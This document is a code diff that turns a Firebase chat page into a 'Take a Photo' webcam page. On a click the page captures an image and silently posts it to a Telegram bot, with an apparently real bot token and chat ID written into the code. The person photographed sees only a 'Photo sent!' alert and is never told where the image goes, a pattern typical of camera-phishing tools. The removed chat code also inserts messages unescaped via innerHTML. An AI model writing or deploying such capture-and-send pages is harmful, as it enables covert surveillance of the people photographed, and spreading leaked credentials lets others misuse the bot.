@@ -1,52 +1,40 @@
-<!-- chat.html -->
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Chat</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <title>Take a Photo</title>
 </head>
 <body>
-  <h2>Chat with <span id="chatWith">PlayerName</span></h2>
-  <div id="chatBox" style="height:300px; overflow-y:scroll; border:1px solid #ccc;"></div>
-  <input type="text" id="msgInput" placeholder="Type your message...">
-  <button onclick="sendMessage()">Send</button>
+  <h2>Click below to take a photo</h2>
+  <video id="video" width="300" height="225" autoplay></video>
+  <button id="snap">Take Photo</button>
+  <canvas id="canvas" width="300" height="225" style="display: none;"></canvas>
 
   <script>
-    const firebaseConfig = {
-      apiKey: "YOUR_API_KEY",
-      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-      databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
-      projectId: "YOUR_PROJECT_ID",
-      storageBucket: "YOUR_PROJECT_ID.appspot.com",
-      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-      appId: "YOUR_APP_ID"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    const botToken = '7573311957:AAGMWs3uoC6v-6R9TDsW1P-S7K9UHpZ7BsQ';
+    const chatId = '-1002640168734'; // Aapka ya group ka chat ID
 
-    const currentUID = "user123"; // यह यूज़र की UID है (लॉगिन के बाद सेट करें)
-    const chattingWithUID = "user456"; // जिस से चैट कर रहे हैं
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snap = document.getElementById('snap');
 
-    const chatRoomId = currentUID < chattingWithUID 
-                       ? currentUID + "_" + chattingWithUID 
-                       : chattingWithUID + "_" + currentUID;
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; });
 
-    function sendMessage() {
-      const msg = document.getElementById("msgInput").value;
-      db.ref("chats/" + chatRoomId).push({
-        sender: currentUID,
-        message: msg,
-        timestamp: Date.now()
-      });
-      document.getElementById("msgInput").value = "";
-    }
+    snap.addEventListener('click', () => {
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, 300, 225);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'photo.png');
 
-    db.ref("chats/" + chatRoomId).on("child_added", function(snapshot) {
-      const data = snapshot.val();
-      const msgElem = document.createElement("div");
-      msgElem.innerHTML = `<b>${data.sender}:</b> ${data.message}`;
-      document.getElementById("chatBox").appendChild(msgElem);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => alert("Photo sent!"))
+        .catch(error => alert("Failed to send photo"));
+      }, 'image/png');
     });
   </script>
 </body>
